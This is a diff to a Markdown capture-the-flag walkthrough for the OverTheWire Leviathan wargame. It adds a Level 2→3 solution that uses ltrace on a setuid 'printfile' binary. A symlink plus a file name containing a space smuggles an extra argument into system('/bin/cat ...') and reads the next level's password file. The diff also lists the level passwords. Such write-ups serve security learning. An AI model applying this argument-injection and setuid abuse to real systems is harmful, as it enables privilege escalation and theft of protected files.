@@ -77,9 +77,6 @@ Credential : `leviathan1:rioGegei8m`
 
 Solution :
 
-
-Solution :
-
 ```
 leviathan1@leviathan:~$ ltrace ./check
 __libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
@@ -110,4 +107,40 @@ $
 Credential : `leviathan2:ougahZi8Ta`
 
 
+## Leviathan Level 2 → Level 3
 
+#### Level Goal
+
+> There is no information for this level, intentionally.
+
+Solution :
+
+```
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
+__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
+access("/etc/leviathan_pass/leviathan2", 4)                                                                          = 0
+snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                = 39
+geteuid()                                                                                                            = 12002
+geteuid()                                                                                                            = 12002
+setreuid(12002, 12002)                                                                                               = 0
+system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                               = 0
++++ exited (status 0) +++
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
+access("/etc/leviathan_pass/leviathan3", 4)                                                                          = -1
+puts("You cant have that file..."You cant have that file...
+)                                                                                   = 27
++++ exited (status 1) +++
+leviathan2@leviathan:~$ mkdir /tmp/0x48piraj/ && cd /tmp/0x48piraj/
+leviathan2@leviathan:/tmp/0x48piraj$ ln -s /etc/leviathan_pass/leviathan3 givemepass
+leviathan2@leviathan:/tmp/0x48piraj$ echo "" > "idk givemepass"
+leviathan2@leviathan:/tmp/0x48piraj$ /home/leviathan2/printfile "/tmp/0x48piraj/idk givemepass"
+/bin/cat: /tmp/0x48piraj/idk: No such file or directory
+Ahdiemoo1j
+leviathan2@leviathan:/tmp/0x48piraj$
+```
+
+Credential : `leviathan3:Ahdiemoo1j`
